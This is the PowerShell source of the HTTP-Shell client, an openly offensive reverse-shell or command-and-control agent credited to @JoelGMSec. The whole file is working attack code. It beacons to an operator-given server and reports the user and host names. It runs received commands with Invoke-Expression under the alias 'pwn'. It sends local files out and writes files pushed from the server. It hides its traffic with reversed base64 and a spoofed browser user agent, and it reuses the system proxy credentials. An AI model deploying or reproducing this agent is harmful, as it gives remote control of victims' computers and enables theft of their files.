#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

# Variables
$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"
New-Alias -name pwn -Value iex -Force
$server = $args[1] ; $sleeps = $args[3]
$userAgent = "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"
$pwshversion = [int]$PSVersionTable.PSVersion.Major
$redirectors = "6>&1 5>&1 4>&1 3>&1"

# Help
if (($args[0] -like "-h*") -or ($args[1] -eq $null)){
Write-Host "[!] Usage: .\HTTP-Client.ps1 -c [HOST:PORT] -s [SLEEP] (optional)`n" -ForegroundColor "Red" ; exit }

# Proxy Aware & TLS Legacy Support
$ProxyKey="HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
$ProxyServer=(Get-ItemProperty -path $ProxyKey ProxyServer 2> $null) ; if ($ProxyServer){
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials }

$Values = $(Foreach ($Value in [System.Enum]::GetNames([System.Net.SecurityProtocolType])){
[System.Net.SecurityProtocolType]::$Value}) ; $SecureProtocols = [string]$Values
$AllProtocols = [System.Net.SecurityProtocolType]"$($SecureProtocols.replace(' ',','))"
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

# Functions
function GetEnviron {
   $usr = $env:username.toLower()+"@"+$env:computername.toLower()
   $pwd = $pwd.path ; Write-Output "$usr!$pwd" | Out-String }

function R64Encoder {
   if ($args[0] -eq "-t") { 
      $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) 2> $null }
   if ($args[0] -eq "-f") { 
      $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) 2> $null }
   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_") 2> $null
   $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 2> $null ; return $R64Base }

function R64Decoder {
   $base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
   $base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
   switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
   if ($args[0] -eq "-t") {
      $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) 2> $null }
   if ($args[0] -eq "-f") {
      $revb64 = [System.Convert]::FromBase64String($base64) } return $revb64 }

function Send-HttpRequest {
   param ([string]$url, [string]$method, [string]$body)
   $request = [System.Net.HttpWebRequest]::Create($url)
   $request.Timeout = 600000
   $request.Method = $method ; $request.UserAgent = $userAgent
   $request.ContentType = "application/x-www-form-urlencoded"
   if ($body) {
      $bytes = [System.Text.Encoding]::ASCII.GetBytes($body)
      $r = $($requestStream = $request.GetRequestStream()) 2> $null
      $r = $($requestStream.Write($bytes, 0, $bytes.Length)) 2> $null
      $r = $($requestStream.Close()) 2> $null }
   $r = $($response = $request.GetResponse()) 2> $null
   $r = $($responseStream = $response.GetResponseStream()) 2> $null
   $r = $($reader = New-Object System.IO.StreamReader($responseStream)) 2> $null
   $r = $($responseText = $reader.ReadToEnd()) 2> $null
   $r = $($reader.Close()) 2> $null ; $r = $($response.Close()) 2> $null
   return $responseText ; $url }

# Main
while ($true) {
   if ($server -notlike "http*") { $server = "http://" + $server }
   $env = GetEnviron ; $invoke64 = $null ; if ($sleeps) { Start-Sleep $sleeps }
   $commandx = $null ; $token = $null ; $errorlog = $null ; $getenv64 = $(R64Encoder -t $env) 2> $null
   $request1 = $(Send-HttpRequest "$server/api/v1/Client/Info" "POST" "Info: $getenv64") 2> $null
   $response = $($token = Send-HttpRequest "$server/api/v1/Client/Token" "GET") 2> $null
   $response = $($invoke64 = R64Decoder -t ($token.Split(" ")[-1])) 2> $null
   if ($token) {

   if ($invoke64 -like "upload*") {
      $file_path = $invoke64.toString().Split("!")[1] ; $invoke64 = $null
      if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
      $download = $($file_content = Send-HttpRequest "$server/api/v1/Client/Download" "GET") 2> $null
      $file_content = $(R64Decoder -f $file_content.ToString().Split(" ")[-1]) 2> $null
      [IO.File]::WriteAllBytes("$file_path", $file_content) 2> $null }

   if ($invoke64 -like "download*") {
      $file_path = $invoke64.toString().Split(" ",2)[1].Split("!")[0] ; $invoke64 = $null
      if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
      $file_content = $(R64Encoder -f "$file_path") 2> $null
      $upload = $(Send-HttpRequest "$server/api/v1/Client/Upload" "POST" "File: $file_content") 2> $null }

   if ($invoke64 -eq "exit") { exit }

   if ($pwshversion -gt 4) { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64 $redirectors") | Out-String) 2>&1 }}
   else { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 }} ; $param = "Debug"
   if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
   else { if (!$commandx) { $commandx = "HTTPShellNull" }}
   $output64 = $(R64Encoder -t $commandx) 2> $null ; [string]$path = $param
   $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2> $null }}
